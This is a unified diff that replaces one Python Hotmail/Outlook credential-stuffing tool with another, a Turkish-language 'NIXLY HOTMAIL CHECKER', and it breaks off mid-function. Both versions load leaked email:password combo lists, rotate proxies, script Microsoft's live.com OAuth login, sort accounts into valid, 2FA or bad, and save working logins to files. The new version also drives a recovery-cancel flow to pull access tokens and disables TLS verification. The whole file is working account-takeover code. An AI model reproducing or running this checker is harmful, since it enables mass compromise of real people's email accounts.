@@ -1,467 +1,482 @@
-#!/usr/bin/env python3
-# roman.py — warm skin, Rich UI
-# pip install requests rich
+# NIXLY HOTMAIL CHECKER TOOL v1.2
+# Hotmail/Outlook/Live checker - Ultra hizli | Full Capture
+# Kullanim: python3 nixly_hotmail_tool.py
+# Requirements: pip install requests urllib3
 
-import os, re, sys, time, threading, collections
-from urllib.parse import urlparse, parse_qs
+import os
+import re
+import sys
+import time
+import random
+import threading
+import requests
+import urllib3
+from datetime import datetime
+from collections import deque
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from tkinter import Tk, filedialog
+from urllib.parse import urlparse, parse_qs
 
-try:
-    import requests
-except ImportError:
-    print("  [!] pip install requests"); sys.exit(1)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-from rich.console import Console, Group
-from rich.table import Table
-from rich.panel import Panel
-from rich.live import Live
-from rich.progress import (
-    Progress, BarColumn, TextColumn, TimeElapsedColumn,
-    MofNCompleteColumn, SpinnerColumn,
-)
-from rich.text import Text
-from rich.align import Align
-from rich.prompt import Prompt, IntPrompt
-from rich.rule import Rule
-from rich import box
+BRAND = "NIXLY HOTMAIL CHECKER"
+VERSION = "1.2"
+RESULT_DIR = "result"
+DEFAULT_THREADS = 30
+DEFAULT_TIMEOUT = 15
+MAX_THREADS = 100
 
-console = Console()
+STATS = {"checked": 0, "valid": 0, "twofa": 0, "bad": 0, "error": 0}
+LOCK = threading.Lock()
 
-# ═══════════════════════════════════════════════════════════════
-#  BANNER
-# ═══════════════════════════════════════════════════════════════
-WORDMARK = [
-    "██████╗  ██████╗ ███╗   ███╗ █████╗ ███╗   ██╗",
-    "██╔══██╗██╔═══██╗████╗ ████║██╔══██╗████╗  ██║",
-    "██████╔╝██║   ██║██╔████╔██║███████║██╔██╗ ██║",
-    "██╔══██╗██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║",
-    "██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║",
-    "╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝",
-]
+R = "\033[0m"
+G = "\033[92m"
+RD = "\033[91m"
+Y = "\033[93m"
+B = "\033[94m"
+M = "\033[95m"
+CY = "\033[96m"
+W = "\033[97m"
+D = "\033[90m"
 
-GOLD   = "#f0b040"
-AMBER  = "#f5d76e"
-COPPER = "#c9793c"
-TEAL   = "#5fb8b0"
-ASH    = "#8a8a8a"
 
 def banner():
-    for line in WORDMARK:
-        t = Text()
-        n = max(1, len(line.rstrip()))
-        for i, ch in enumerate(line):
-            if ch == " ":
-                t.append(" ")
-            else:
-                if   i < n * 0.33: style = f"bold {GOLD}"
-                elif i < n * 0.66: style = f"bold {AMBER}"
-                else:              style = f"bold {COPPER}"
-                t.append(ch, style=style)
-        console.print(t, justify="center")
-    console.print(Align.center(Text("Dev - @Spxcter", style=f"italic {ASH}")))
-    console.print(Align.center(Text("─" * 28, style=COPPER)))
-    console.print()
+    print()
+    print(f"{CY}{'=' * 72}{R}")
+    print(f"{Y}  NIXLY HOTMAIL CHECKER TOOL v{VERSION}{R}")
+    print(f"{Y}  Hotmail / Outlook / Live | Proxy | Result{R}")
+    print(f"{CY}{'=' * 72}{R}")
+    print()
+    print(f"{G}  [+] Hotmail / Outlook / Live{R}")
+    print(f"{G}  [+] RPS login (Xbox OAuth){R}")
+    print(f"{G}  [+] A-Shell uyumlu (max {MAX_THREADS} thread){R}")
+    print(f"{G}  [+] Proxy destegi{R}")
+    print(f"{G}  [+] Sonuclar result/ klasorune{R}")
+    print()
+    print(f"{CY}{'=' * 72}{R}")
+    print(f"{M}  Powered by NIXLY{R}")
+    print(f"{CY}{'=' * 72}{R}")
+    print()
 
-# ═══════════════════════════════════════════════════════════════
-#  ENGINE
-# ═══════════════════════════════════════════════════════════════
-CLIENT_ID = "00000000402b5328"
-SCOPE     = "service::user.auth.xboxlive.com::MBI_SSL"
-REDIRECT  = "https://login.live.com/oauth20_desktop.srf"
-AUTH_URL  = (
-    "https://login.live.com/oauth20_authorize.srf"
-    f"?client_id={CLIENT_ID}&response_type=code"
-    f"&scope={SCOPE.replace(':', '%3A')}"
-    f"&redirect_uri={REDIRECT.replace(':', '%3A').replace('/', '%2F')}"
-)
-OUTDIR = "output"
-HEADERS = {
-    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                   "AppleWebKit/537.36 (KHTML, like Gecko) "
-                   "Chrome/124.0.0.0 Safari/537.36"),
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    "Accept-Language": "en-US,en;q=0.9",
-}
-PPFT_RE = [
-    re.compile(r'"sFTTag":".*?value=\\"([^\\]+)\\"/>', re.S),
-    re.compile(r'name="PPFT"[^>]*value="([^"]+)"'),
-    re.compile(r'value="([^"]+)"[^>]*name="PPFT"'),
-]
-URLPOST_RE = [
-    re.compile(r'"urlPost":"([^"]+)"'),
-    re.compile(r"urlPost:'([^']+)'"),
-]
-MS_DOMAINS = ("hotmail.", "outlook.", "live.", "msn.", "passport.")
 
-def is_ms(e):
-    try: d = e.rsplit("@", 1)[1].lower()
-    except IndexError: return False
-    return any(x in d for x in MS_DOMAINS)
+def log(tag, msg, color=W):
+    ts = datetime.now().strftime("%H:%M:%S")
+    print(f"{D}[{ts}]{R} {color}{tag}{R} {msg}")
 
-class Stats:
-    def __init__(self, n):
-        self.lock  = threading.Lock()
-        self.total = n
-        self.done = self.valid = self.mfa = self.invalid = 0
-        self.locked = self.error = self.retry = 0
-        self.start = time.time()
-    def bump(self, s):
-        with self.lock:
-            self.done += 1
-            if   s == "valid":   self.valid += 1
-            elif s == "mfa":     self.mfa += 1
-            elif s == "invalid": self.invalid += 1
-            elif s == "locked":  self.locked += 1
-            elif s == "retry":   self.retry += 1
-            else:                self.error += 1
-    def snap(self):
-        with self.lock:
-            return dict(total=self.total, done=self.done, valid=self.valid,
-                        mfa=self.mfa, invalid=self.invalid, locked=self.locked,
-                        error=self.error, retry=self.retry,
-                        elapsed=time.time() - self.start)
 
-class ProxyPool:
-    def __init__(self, path):
-        self.items = []
-        if path and os.path.isfile(path):
-            with open(path, "r", encoding="utf-8", errors="ignore") as f:
-                self.items = [l.strip() for l in f if l.strip()]
-        self.i = 0
-        self.lock = threading.Lock()
-    def next(self):
-        if not self.items: return None
-        with self.lock:
-            p = self.items[self.i % len(self.items)]; self.i += 1
-        if "@" in p:
-            cred, hp = p.rsplit("@", 1)
-            u, pw = cred.split(":", 1)
-            url = f"http://{u}:{pw}@{hp}"
-        else:
-            url = f"http://{p}"
-        return {"http": url, "https": url}
-
-def extract_ppft(h):
-    for rx in PPFT_RE:
-        m = rx.search(h)
-        if m: return m.group(1)
+def normalize_combo(line):
+    line = line.strip()
+    if not line or line.startswith("#"):
+        return None
+    for sep in (":", "|", ";", ","):
+        if sep in line:
+            parts = line.split(sep, 1)
+            u = parts[0].strip()
+            p = parts[1].strip()
+            if u and p and "@" in u:
+                return f"{u}:{p}"
+    if " " in line:
+        parts = line.split(" ", 1)
+        u = parts[0].strip()
+        p = parts[1].strip()
+        if u and p and "@" in u:
+            return f"{u}:{p}"
     return None
 
-def extract_urlpost(h):
-    for rx in URLPOST_RE:
-        m = rx.search(h)
-        if m: return m.group(1)
-    return None
 
-def has_code(u):
-    try: return bool(parse_qs(urlparse(u).query).get("code"))
-    except Exception: return "code=" in (u or "")
-
-def check(combo, pool):
-    combo = combo.strip()
-    if not combo or ":" not in combo:
-        return "invalid", "malformed", combo
-    email, pw = combo.split(":", 1)
-    s = requests.Session(); s.headers.update(HEADERS)
-    prox = pool.next()
-    if prox: s.proxies.update(prox)
+def scan_txt_files(directory="."):
+    files = []
     try:
-        try:
-            r = s.get(AUTH_URL, timeout=25, allow_redirects=True)
-        except requests.exceptions.ProxyError:
-            return "retry", "proxy", combo
-        except requests.exceptions.Timeout:
-            return "retry", "timeout", combo
-        except Exception as e:
-            return "error", type(e).__name__.lower(), combo
-        if r.status_code != 200:
-            return "error", f"http_{r.status_code}", combo
-        ppft, urlpost = extract_ppft(r.text), extract_urlpost(r.text)
-        if not ppft or not urlpost:
-            low = r.text.lower()
-            if "captcha" in low or "unusual activity" in low:
-                return "error", "captcha", combo
-            return "error", "parse_failed", combo
-        data = {"login": email, "loginfmt": email, "passwd": pw, "PPFT": ppft}
-        headers = {"Content-Type": "application/x-www-form-urlencoded",
-                   "Origin": "https://login.live.com", "Referer": AUTH_URL}
-        try:
-            r2 = s.post(urlpost, data=data, headers=headers,
-                        timeout=25, allow_redirects=True)
-        except requests.exceptions.ProxyError:
-            return "retry", "proxy", combo
-        except requests.exceptions.Timeout:
-            return "retry", "timeout", combo
-        except Exception as e:
-            return "error", type(e).__name__.lower(), combo
-        chain = [h.url for h in r2.history] + [r2.url]
-        final = (r2.url or "").lower(); body = (r2.text or "").lower()
-        if any(has_code(u) for u in chain):
-            return "valid", "no_mfa", combo
-        if any(x in final for x in ("interrupt","proof","confirm","identity/",
-                                    "fido","mfa","twofactor","authenticator","otp")):
-            return "mfa", "mfa_required", combo
-        if ("c0000066" in body or "password is incorrect" in body
-                or "account or password is incorrect" in body):
-            return "invalid", "wrong_password", combo
-        if "c0000236" in body or "account has been locked" in body:
-            return "locked", "locked", combo
-        if "c0000224" in body or "account is disabled" in body:
-            return "locked", "disabled", combo
-        if "c0000225" in body or "doesn't exist" in body or "does not exist" in body:
-            return "invalid", "no_account", combo
-        if "captcha" in body or "unusual activity" in body:
-            return "error", "captcha", combo
-        if "login.live.com" in final and not has_code(final):
-            if "sfttag" in body or "ppft" in body:
-                return "invalid", "login_rejected", combo
-            return "error", "login_page_unknown", combo
-        return "error", "unknown", combo
-    finally:
-        s.close()
+        for f in sorted(os.listdir(directory)):
+            if f.lower().endswith(".txt"):
+                full = os.path.join(directory, f)
+                if os.path.isfile(full):
+                    try:
+                        size = os.path.getsize(full)
+                        count = 0
+                        with open(full, "r", encoding="utf-8", errors="ignore") as fh:
+                            for _ in fh:
+                                count += 1
+                                if count >= 100000:
+                                    break
+                        count_str = "100k+" if count >= 100000 else f"{count:,}"
+                    except Exception:
+                        size = 0
+                        count_str = "?"
+                    files.append((f, full, size, count_str))
+    except Exception as e:
+        log("[!]", f"Klasor okunamadi: {e}", RD)
+    return files
 
-def save(status, reason, combo):
-    if status == "retry": return
-    if   status == "valid": path = os.path.join(OUTDIR, "VALID.txt")
-    elif status == "mfa":   path = os.path.join(OUTDIR, "VALID_pendingSecurity.txt")
-    else:                   path = os.path.join(OUTDIR, "others", f"{reason}.txt")
-    with open(path, "a", encoding="utf-8") as f:
-        f.write(combo + "\n")
 
-# ═══════════════════════════════════════════════════════════════
-#  LIVE VIEW
-# ═══════════════════════════════════════════════════════════════
-TONE = {
-    "valid":   ("✓", GOLD),
-    "mfa":     ("⚿", TEAL),
-    "invalid": ("✗", "#d06464"),
-    "locked":  ("⊘", AMBER),
-    "error":   ("⚠", COPPER),
-    "retry":   ("↻", ASH),
-}
-NAME = {"valid":"VALID","mfa":"MFA","invalid":"INVALID",
-        "locked":"LOCKED","error":"ERROR","retry":"RETRY"}
+def ask_combo_source():
+    import tkinter as tk
+    from tkinter import filedialog
 
-class View:
-    def __init__(self, stats):
-        self.stats    = stats
-        self.lock     = threading.Lock()
-        self.activity = collections.deque(maxlen=14)
-        self.hits     = collections.deque(maxlen=8)
-        self.current  = ("", "")
+    print(f"{CY}COMBO DOSYASI SEC{R}")
+    print(f"  {D}Dosya secme penceresi aciliyor...{R}")
+    print()
 
-    def push(self, status, reason, combo):
-        with self.lock:
-            self.activity.append((time.strftime("%H:%M:%S"), status, combo[:72], reason))
-            if status in ("valid", "mfa"):
-                self.hits.append((status, combo[:72]))
-            self.current = (combo[:72], reason)
-
-    def _headline(self, s):
-        elapsed = max(0.001, s["elapsed"])
-        cpm     = int(s["done"] / elapsed * 60)
-        pct     = (s["done"] / s["total"] * 100) if s["total"] else 0
-        left    = s["total"] - s["done"]
-        eta     = int(left / (cpm / 60)) if cpm else 0
-
-        g = Table.grid(expand=True, padding=(0, 1))
-        for _ in range(5): g.add_column(justify="center")
-        g.add_row(
-            f"[bold {GOLD}]{s['valid']}[/]",
-            f"[bold {TEAL}]{s['mfa']}[/]",
-            f"[bold #d06464]{s['invalid']}[/]",
-            f"[bold {AMBER}]{s['locked']}[/]",
-            f"[bold {COPPER}]{s['error']}[/]",
-        )
-        g.add_row(f"[{GOLD}]valid[/]", f"[{TEAL}]mfa[/]", "[#d06464]invalid[/]",
-                  f"[{AMBER}]locked[/]", f"[{COPPER}]error[/]")
-
-        title = f"[{AMBER}]{pct:0.1f}%  ·  {s['done']}/{s['total']}  ·  {cpm} cpm  ·  eta {eta}s[/]"
-        return Panel(g, title=title, border_style=COPPER, box=box.ROUNDED,
-                     padding=(0, 1))
-
-    def _hits_panel(self, s):
-        with self.lock: hits = list(self.hits)
-        if not hits:
-            body = Text("  awaiting first valid…", style=f"italic {ASH}")
-        else:
-            rows = []
-            for status, txt in hits:
-                sym, color = TONE[status]
-                t = Text()
-                t.append(f" {sym} ", style=f"bold {color}")
-                t.append(txt, style="white")
-                rows.append(t)
-            body = Group(*rows)
-        return Panel(body, title=f"[{GOLD}]accepted  ({s['valid'] + s['mfa']})[/]",
-                     border_style=GOLD, box=box.ROUNDED, padding=(0, 0))
-
-    def _feed_panel(self):
-        with self.lock: events = list(self.activity)
-        if not events:
-            body = Text("  warming up…", style=f"italic {ASH}")
-        else:
-            rows = []
-            for ts, status, combo, reason in events:
-                sym, color = TONE.get(status, ("·", ASH))
-                t = Text()
-                t.append(f"{ts}  ", style=ASH)
-                t.append(f"{sym}  ", style=f"bold {color}")
-                t.append(f"{NAME.get(status,'?'):<7}", style=f"bold {color}")
-                t.append(combo, style="white")
-                if status in ("error","locked"):
-                    t.append(f"  · {reason}", style=ASH)
-                rows.append(t)
-            body = Group(*rows)
-        return Panel(body, title=f"[{COPPER}]thread feed[/]",
-                     border_style=COPPER, box=box.ROUNDED, padding=(0, 0))
-
-    def _footer(self):
-        with self.lock: c, r = self.current
-        if not c:
-            return Text(f"  ▸ standing by", style=f"italic {ASH}")
-        t = Text()
-        t.append("  ▸ ", style=f"bold {GOLD}")
-        t.append(c, style="white")
-        t.append(f"   {r}", style=ASH)
-        return t
-
-    def render(self, progress):
-        s = self.stats.snap()
-        upper = self._headline(s)
-        mid   = Table.grid(expand=True, padding=(0, 1))
-        mid.add_column(ratio=3)
-        mid.add_column(ratio=2)
-        mid.add_row(self._feed_panel(), self._hits_panel(s))
-        return Group(upper, mid, self._footer(), progress)
-
-# ═══════════════════════════════════════════════════════════════
-#  LAUNCHER  — dosya seçim pencereleri
-# ═══════════════════════════════════════════════════════════════
-def pick_file(title, required=True):
-    """Tkinter dosya seçim penceresi açar. required=True ise iptal edilirse çıkar."""
-    root = Tk()
+    root = tk.Tk()
     root.withdraw()
-    root.attributes("-topmost", True)  # pencere öne gelsin
-    p = filedialog.askopenfilename(
-        title=title,
-        filetypes=[("Metin Dosyaları", "*.txt"), ("Tüm Dosyalar", "*.*")]
+    root.attributes("-topmost", True)
+
+    path = filedialog.askopenfilename(
+        title="Combo dosyasini sec",
+        filetypes=[("Text dosyalari", "*.txt"), ("Tum dosyalar", "*.*")]
     )
     root.destroy()
-    if not p:
-        if required:
-            console.print(f"[#d06464]✗ dosya seçilmedi, çıkılıyor[/]\n")
-            sys.exit(0)
+
+    if not path:
+        log("[!]", "Dosya secilmedi", RD)
         return None
-    console.print(f"[{ASH}]▸ seçilen:[/] [white]{p}[/]\n")
-    return p
 
-def ask_threads():
+    if not os.path.isfile(path):
+        log("[!]", f"Dosya bulunamadi: {path}", RD)
+        return None
+
+    log("[+]", f"Secilen dosya: {os.path.basename(path)}", G)
+    return path
+
+
+def ask_proxy():
+    print()
+    print(f"{CY}PROXY KULLANIMI{R}")
+    print(f"  {Y}[1]{R} Proxy dosyasi kullan")
+    print(f"  {Y}[2]{R} Proxy kullanma")
+    print()
     while True:
-        n = IntPrompt.ask(f"[bold {GOLD}]threads[/]", default=10)
-        if 1 <= n <= 200: return n
-        console.print("[#d06464]✗ 1-200[/]\n")
+        try:
+            choice = input(f"{CY}Secim (1/2): {R}").strip()
+        except (EOFError, KeyboardInterrupt):
+            return []
+        if choice == "2":
+            return []
+        if choice == "1":
+            try:
+                path = input(f"{CY}Proxy dosya yolu: {R}").strip().strip('"').strip("'")
+            except (EOFError, KeyboardInterrupt):
+                return []
+            if not os.path.isfile(path):
+                log("[!]", f"Proxy dosyasi bulunamadi: {path}", RD)
+                continue
+            proxies = []
+            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith("#"):
+                        proxies.append(line)
+            if not proxies:
+                log("[!]", "Proxy listesi bos", RD)
+                continue
+            log("[+]", f"{len(proxies)} proxy yuklendi", G)
+            return proxies
 
-def run():
-    console.clear()
+
+def format_proxy(p):
+    if not p:
+        return None
+    p = p.strip()
+    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
+        return p
+    parts = p.split(":")
+    if len(parts) == 2:
+        return f"http://{parts[0]}:{parts[1]}"
+    if len(parts) == 4:
+        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+    if "@" in p:
+        return f"http://{p}"
+    return f"http://{p}"
+
+
+def create_session(proxy=None):
+    s = requests.Session()
+    s.verify = False
+    if proxy:
+        s.proxies = {"http": proxy, "https": proxy}
+    s.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                      "AppleWebKit/537.36 (KHTML, like Gecko) "
+                      "Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+    })
+    return s
+
+
+class HotmailChecker:
+    def __init__(self, email, password, proxy=None, timeout=DEFAULT_TIMEOUT):
+        self.email = email
+        self.password = password
+        self.timeout = timeout
+        self.session = create_session(proxy)
+        self.url = ("https://login.live.com/oauth20_authorize.srf?"
+                    "client_id=00000000402B5328"
+                    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
+                    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
+                    "&display=touch&response_type=token&locale=en")
+
+    def get_ft(self):
+        for _ in range(3):
+            try:
+                t = self.session.get(self.url, timeout=self.timeout).text
+                m = (re.search('value=\\\\\\"(.+?)\\\\\\"', t, re.S)
+                     or re.search('value="(.+?)"', t, re.S)
+                     or re.search("sFTTag:'(.+?)'", t, re.S)
+                     or re.search('sFTTag:"(.+?)"', t, re.S)
+                     or re.search('name="PPFT".*?value="(.+?)"', t, re.S))
+                if m:
+                    tag = m.group(1)
+                    m2 = (re.search('"urlPost":"(.+?)"', t, re.S)
+                          or re.search("urlPost:'(.+?)'", t, re.S)
+                          or re.search('urlPost:"(.+?)"', t, re.S)
+                          or re.search('<form.*?action="(.+?)"', t, re.S))
+                    if m2:
+                        return m2.group(1).replace("&amp;", "&"), tag
+            except Exception:
+                pass
+            time.sleep(0.2)
+        return None, None
+
+    def rps(self, urlPost, sFTTag):
+        for _ in range(3):
+            try:
+                data = {"login": self.email, "loginfmt": self.email,
+                        "passwd": self.password, "PPFT": sFTTag}
+                r = self.session.post(urlPost, data=data, allow_redirects=True,
+                                      timeout=self.timeout)
+
+                # Basarili giris
+                if "#" in r.url and r.url != self.url:
+                    token = parse_qs(urlparse(r.url).fragment).get("access_token", ["None"])[0]
+                    if token != "None":
+                        return "SUCCESS"
+
+                # Cancel flow (dogrulama kaldi)
+                if "cancel?mkt=" in r.text:
+                    try:
+                        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', r.text)
+                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', r.text)
+                        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', r.text)
+                        if ipt and pprid and uaid:
+                            data2 = {"ipt": ipt.group(), "pprid": pprid.group(), "uaid": uaid.group()}
+                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r.text)
+                            if action:
+                                ret = self.session.post(action.group(), data=data2,
+                                                        allow_redirects=True,
+                                                        timeout=self.timeout)
+                                ret_url = re.search(
+                                    r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)',
+                                    ret.text)
+                                if ret_url:
+                                    fin = self.session.get(ret_url.group(),
+                                                           allow_redirects=True,
+                                                           timeout=self.timeout)
+                                    token = parse_qs(urlparse(fin.url).fragment).get(
+                                        "access_token", ["None"])[0]
+                                    if token != "None":
+                                        return "SUCCESS"
+                    except Exception:
+                        pass
+
+                # 2FA
+                if any(v in r.text for v in [
+                    "recover?mkt", "account.live.com/identity/confirm?mkt",
+                    "Email/Confirm?mkt", "/Abuse?mkt="]):
+                    return "2FA"
+
+                # Bad
+                if any(v in r.text.lower() for v in [
+                    "password is incorrect",
+                    "account doesn't exist",
+                    "that microsoft account doesn't exist",
+                    "sign in to your microsoft account",
+                    "tried to sign in too many times with an incorrect account or password",
+                    "help us protect your account"]):
+                    return "BAD"
+            except Exception:
+                pass
+            time.sleep(0.2)
+        return "BAD"
+
+    def check(self):
+        u, t = self.get_ft()
+        if not u or not t:
+            return "BAD"
+        return self.rps(u, t)
+
+
+def format_valid(combo):
+    sep = "=" * 72
+    return (f"{sep}\n"
+            f"  NIXLY HOTMAIL CHECKER v{VERSION}\n"
+            f"{sep}\n\n"
+            f"Giris  : {combo}\n"
+            f"Durum  : VALID\n"
+            f"Config : NIXLY\n\n"
+            f"{sep}\n"
+            f"  Powered by NIXLY\n"
+            f"{sep}\n")
+
+
+def format_2fa(combo):
+    sep = "=" * 72
+    return (f"{sep}\n"
+            f"  NIXLY HOTMAIL CHECKER v{VERSION}\n"
+            f"{sep}\n\n"
+            f"Giris  : {combo}\n"
+            f"Durum  : 2FA GEREKLI\n"
+            f"Config : NIXLY\n\n"
+            f"{sep}\n"
+            f"  Powered by NIXLY\n"
+            f"{sep}\n")
+
+
+def save_result(filename, content):
+    os.makedirs(RESULT_DIR, exist_ok=True)
+    with open(os.path.join(RESULT_DIR, filename), "a", encoding="utf-8") as f:
+        f.write(content + "\n")
+
+
+def save_simple(filename, line):
+    os.makedirs(RESULT_DIR, exist_ok=True)
+    with open(os.path.join(RESULT_DIR, filename), "a", encoding="utf-8") as f:
+        f.write(line + "\n")
+
+
+def check_one(combo, proxy):
+    global STATS
+    try:
+        if ":" not in combo:
+            return
+        email, password = combo.split(":", 1)
+        email = email.strip()
+        password = password.strip()
+
+        chk = HotmailChecker(email, password, proxy)
+        status = chk.check()
+
+        with LOCK:
+            STATS["checked"] += 1
+            if status == "SUCCESS":
+                STATS["valid"] += 1
+                save_result("valid.txt", format_valid(combo))
+                save_simple("valid_simple.txt", combo)
+                print(f"{G}[+] VALID{R} {combo}")
+            elif status == "2FA":
+                STATS["twofa"] += 1
+                save_result("2fa.txt", format_2fa(combo))
+                save_simple("2fa_simple.txt", combo)
+                print(f"{Y}[?] 2FA  {R} {combo}")
+            else:
+                STATS["bad"] += 1
+                save_simple("bad_simple.txt", combo)
+                print(f"{RD}[-] BAD  {R} {combo}")
+    except Exception as e:
+        with LOCK:
+            STATS["error"] += 1
+            print(f"{Y}[!] ERR  {R} {combo} {D}({e}){R}")
+
+
+def run_checker(accounts, proxies, threads):
+    total = len(accounts)
+    log("[+]", f"Toplam {total} combo islenecek", M)
+    log("[i]", f"Thread: {threads} | Proxy: {len(proxies)}", B)
+    print()
+
+    start = time.time()
+    with ThreadPoolExecutor(max_workers=threads) as ex:
+        futures = []
+        for combo in accounts:
+            proxy = format_proxy(random.choice(proxies)) if proxies else None
+            futures.append(ex.submit(check_one, combo, proxy))
+        for _ in as_completed(futures):
+            pass
+
+    elapsed = time.time() - start
+    print()
+    print(f"{CY}{'=' * 72}{R}")
+    print(f"{CY}  SONUC{R}")
+    print(f"{CY}{'=' * 72}{R}")
+    print(f"  {W}Toplam   :{R} {STATS['checked']}")
+    print(f"  {G}Valid    :{R} {STATS['valid']}")
+    print(f"  {Y}2FA      :{R} {STATS['twofa']}")
+    print(f"  {RD}Bad      :{R} {STATS['bad']}")
+    print(f"  {Y}Hata     :{R} {STATS['error']}")
+    print(f"  {W}Sure     :{R} {elapsed:.1f}s")
+    if elapsed > 0:
+        cpm = int(STATS["checked"] / elapsed * 60)
+        print(f"  {M}Hiz      :{R} {cpm} CPM")
+    print(f"  {CY}Sonuclar :{R} {RESULT_DIR}/")
+    print(f"{CY}{'=' * 72}{R}")
+    print()
+
+
+def main():
     banner()
 
-    # ── combo dosyası (pencere ile) ──
-    path = pick_file("Combo dosyasını seç")
-    with open(path, "r", encoding="utf-8", errors="ignore") as f:
-        combos = [l.strip() for l in f if l.strip()]
-    if not combos:
-        console.print("[#d06464]✗ empty file[/]"); return
+    combo_path = ask_combo_source()
+    if not combo_path:
+        log("[!]", "Combo kaynagi secilmedi", RD)
+        return
 
-    ms = [c for c in combos if ":" in c and is_ms(c.split(":", 1)[0])]
-    use_filter = False
-    if len(ms) != len(combos) and ms:
-        ans = Prompt.ask(
-            f"[bold {GOLD}]microsoft-only filter?[/] "
-            f"[dim]({len(ms)} of {len(combos)})[/]", default="y").lower()
-        if ans.startswith("y"):
-            combos, use_filter = ms, True
-    if not combos:
-        console.print("[#d06464]✗ nothing to check[/]"); return
-
-    threads = ask_threads()
-
-    # ── proxy dosyası (pencere ile, iptal = proxy yok) ──
-    pp = pick_file("Proxy dosyası (iptal = proxy yok)", required=False)
-    pool = ProxyPool(pp)
-
-    os.makedirs(os.path.join(OUTDIR, "others"), exist_ok=True)
-    for f in ("VALID.txt", "VALID_pendingSecurity.txt"):
-        p = os.path.join(OUTDIR, f)
-        if os.path.exists(p): os.remove(p)
-    for f in os.listdir(os.path.join(OUTDIR, "others")):
-        os.remove(os.path.join(OUTDIR, "others", f))
-
-    summary = Table(box=box.SIMPLE_HEAVY, show_header=False, padding=(0, 2))
-    summary.add_column(style=ASH); summary.add_column(style="white")
-    summary.add_row("combos",   f"{len(combos):,}")
-    summary.add_row("threads",  str(threads))
-    summary.add_row("proxies",  str(len(pool.items)) if pool.items else "none")
-    summary.add_row("filter",   "microsoft only" if use_filter else "off")
-    summary.add_row("flow",     "browser login · live.com")
-    summary.add_row("output",   os.path.abspath(OUTDIR))
-    console.print(Panel(summary, title=f"[{GOLD}]session[/]",
-                        border_style=COPPER, box=box.ROUNDED, padding=(0, 1)))
-
-    Prompt.ask(f"[dim]press enter to start (ctrl+c to stop)[/]", default="", show_default=False)
-
-    stats = Stats(len(combos))
-    view  = View(stats)
-
-    progress = Progress(
-        SpinnerColumn(style=AMBER),
-        TextColumn(f"[{GOLD}]throughput"),
-        BarColumn(bar_width=None, complete_style=GOLD, finished_style=GOLD),
-        MofNCompleteColumn(),
-        TextColumn("·"), TimeElapsedColumn(),
-        console=console,
-    )
-    ptask = progress.add_task("check", total=len(combos))
-
+    print()
+    log("[~]", f"Combo listesi okunuyor: {combo_path}", Y)
+    accounts = []
+    seen = set()
     try:
-        with Live(view.render(progress), console=console,
-                  refresh_per_second=8, transient=False) as live:
-            ex = ThreadPoolExecutor(max_workers=threads)
-            futs = [ex.submit(check, c, pool) for c in combos]
-            try:
-                for fut in as_completed(futs):
-                    status, reason, combo = fut.result()
-                    if status == "retry":
-                        status, reason, combo = check(combo, pool)
-                    save(status, reason, combo)
-                    stats.bump(status)
-                    view.push(status, reason, combo)
-                    progress.update(ptask, completed=stats.snap()["done"])
-                    live.update(view.render(progress))
-            finally:
-                ex.shutdown(wait=False, cancel_futures=True)
-    except KeyboardInterrupt:
-        console.print(f"\n[{COPPER}]stopped early[/]")
+        with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                n = normalize_combo(line)
+                if n and n not in seen:
+                    seen.add(n)
+                    accounts.append(n)
+    except Exception as e:
+        log("[!]", f"Dosya okunamadi: {e}", RD)
+        return
 
-    s = stats.snap()
-    final = Table(box=box.DOUBLE, padding=(0, 2),
-                  title=f"[bold {GOLD}]finished[/]", title_justify="center")
-    for label, color in [("valid", GOLD), ("mfa", TEAL),
-                         ("invalid", "#d06464"), ("locked", AMBER), ("error", COPPER)]:
-        final.add_column(NAME[label], style=f"bold {color}")
-    final.add_row(str(s["valid"]), str(s["mfa"]), str(s["invalid"]),
-                  str(s["locked"]), str(s["error"]))
-    console.print()
-    console.print(Align.center(final))
-    console.print(Align.center(Text(
-        f"{s['done']:,}/{s['total']:,} in {int(s['elapsed'])}s  ·  "
-        f"output/VALID.txt  ·  output/VALID_pendingSecurity.txt",
-        style=ASH)))
-    console.print()
+    if not accounts:
+        log("[!]", "Gecerli combo bulunamadi", RD)
+        return
+
+    log("[+]", f"{len(accounts)} gecerli combo yuklendi", G)
+
+    proxies = ask_proxy()
+
+    print()
+    print(f"{CY}THREAD SAYISI{R}")
+    print(f"  {D}Varsayilan: {DEFAULT_THREADS} | Max: {MAX_THREADS} (Enter'a bas){R}")
+    try:
+        t_input = input(f"{CY}Thread: {R}").strip()
+    except (EOFError, KeyboardInterrupt):
+        return
+    if t_input:
+        try:
+            threads = max(1, min(int(t_input), MAX_THREADS))
+        except ValueError:
+            threads = DEFAULT_THREADS
+    else:
+        threads = DEFAULT_THREADS
+
+    print()
+    print(f"{CY}{'-' * 72}{R}")
+    print(f"  Combo   : {len(accounts)}")
+    print(f"  Thread  : {threads}")
+    print(f"  Proxy   : {len(proxies) if proxies else 'Yok'}")
+    print(f"  Kaynak  : {combo_path}")
+    print(f"{CY}{'-' * 72}{R}")
+    print()
+    try:
